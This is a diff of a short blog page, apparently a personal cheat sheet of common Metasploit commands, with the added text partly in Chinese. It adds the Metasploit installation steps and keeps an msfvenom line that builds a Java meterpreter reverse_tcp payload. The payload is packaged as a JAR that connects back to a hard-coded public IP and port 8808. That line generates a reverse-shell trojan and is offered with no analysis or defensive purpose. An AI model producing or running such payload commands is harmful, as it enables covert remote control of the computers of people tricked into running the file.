@@ -360,7 +360,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/18/msf-shell/">msf_shell</a>
+      <a class="article-title" href="/2018/01/18/msf-shell/">msf常用命令</a>
     </h1>
   
 
@@ -370,7 +370,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <pre><code>java/meterpreter/reverse_tcp
+        <p>Msf安装：</p>
+<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+
+chmod 755 msfinstall &amp;&amp; ./msfinstall
+</code></pre><hr>
+<p>Msfshell</p>
+<pre><code>java/meterpreter/reverse_tcp
 
 msfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar
 </code></pre>
